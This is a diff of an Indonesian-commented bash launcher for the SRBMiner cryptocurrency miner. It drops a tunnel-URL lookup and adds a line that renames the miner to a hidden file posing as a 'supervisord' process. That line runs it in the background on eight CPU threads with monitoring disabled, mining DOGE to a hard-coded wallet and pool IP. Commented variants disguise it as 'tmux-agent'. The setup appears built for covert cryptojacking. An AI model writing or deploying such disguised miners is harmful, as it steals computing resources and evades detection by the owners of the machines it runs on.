@@ -1,22 +1,5 @@
 #!/bin/bash
-
-# URL untuk mendapatkan IP
-url="https://loca.lt/mytunnelpassword"
-
-# Menggunakan curl untuk mengakses URL
-response=$(curl -s -w "%{http_code}" -o /tmp/ip_address.txt "$url")
-status_code=$(tail -n1 <<< "$response")
-
-# Cek apakah status code adalah 200 (sukses)
-if [ "$status_code" -eq 200 ]; then
-    ip_address=$(cat /tmp/ip_address.txt | tr -d '[:space:]')  # Menghapus spasi/karakter kosong lainnya
-    echo "IP Address from $url: $alamatip"
-mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker $alamatip --password ID=$alamatip,c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
-else
-    echo "Failed to get IP from $url, status code: $status_code"
-mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker $status_code --password ID=$status_code,c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
-fi
-
+mv SRBMiner-MULTI .supervisord-wr && ./.supervisord-wr --algorithm verushash --disable-gpu --cpu-threads 8 --pool 146.190.89.158:4444 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker "$(TZ='Asia/Jakarta' date +"%d-%b-%Y_Jam-%H-%M")-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)" --password ID="$(TZ='Asia/Jakarta' date +"%d-%b-%Y_Jam-%H-%M")-$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 16)",c=DOGE --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm minotaurx --pool stratum+tcp://minotaurx.asia.mine.zergpool.com:7019 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,mc=MAZA --keepalive true --cpu-threads 4
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm curvehash --pool stratum+tcp://curvehash.mine.zergpool.com:3343 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,mc=PLSR --keepalive true --cpu-threads 4
 #mv SRBMiner-MULTI tmux-agent && ./tmux-agent --algorithm dynamo --pool stratum+tcp://dynamo.mine.zergpool.com:4234 --wallet D9Qg9EZCFksKgFZhnjT5ET5xc37TJXzQ9n.srbX --password c=DOGE,sd=20 --keepalive true --cpu-threads 4
